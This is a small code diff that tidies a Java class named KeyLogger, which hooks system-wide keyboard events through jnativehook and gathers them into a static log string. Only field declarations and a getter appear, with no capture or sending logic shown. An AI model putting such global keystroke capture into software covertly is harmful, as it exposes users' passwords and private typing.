@@ -4,21 +4,16 @@ import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
-
 import java.util.logging.Logger;
 
-/**
- * @author vakho
- */
 public class KeyLogger implements NativeKeyListener {
     private static Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
     private static final String RIGHT_SHIFT_KEYCODE = "0xe36";
     private static final String RIGHT_SHIFT_KEY_TEXT = "Shift";
     private static final String SPLITTER = ";";
-    private static final String NONE = "";
     private static final String FORMAT = SPLITTER + "%s" + SPLITTER;
+
     private static String temp = "";
-    private static boolean IS_FIRST_SPlIT = true;
 
     public static String getLog() {
         return temp;
